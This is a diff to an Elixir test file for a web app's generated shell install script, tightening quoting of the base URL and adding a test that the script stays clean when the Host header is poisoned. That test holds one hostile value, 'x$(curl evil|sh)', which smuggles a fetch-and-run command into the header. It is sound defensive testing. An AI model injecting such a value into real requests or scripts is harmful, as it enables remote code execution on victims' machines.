@@ -63,12 +63,24 @@ defmodule SlipdockWeb.AgentSetupTest do
 
       assert response_content_type(conn, :txt) =~ "text/plain"
       assert script =~ "#!/bin/sh"
-      assert script =~ ~s(BASE="https://boards.example.test")
+      assert script =~ ~s(BASE='https://boards.example.test')
       assert script =~ "/api/skills.tar.gz"
       assert script =~ ".config/slipdock/url"
       # Only curl and tar: the whole point is a machine with no Elixir on it.
       assert script =~ "for tool in curl tar; do"
       refute script =~ "mix "
+    end
+
+    @tag :anonymous
+    test "a Host header carrying shell falls back to the configured address", %{conn: conn} do
+      script =
+        conn
+        |> Map.put(:host, "x$(curl evil|sh)")
+        |> get("/install.sh")
+        |> response(200)
+
+      refute script =~ "curl evil"
+      assert script =~ "BASE='#{SlipdockWeb.Endpoint.url()}'"
     end
 
     # Another install's script must not re-point an existing url file: the
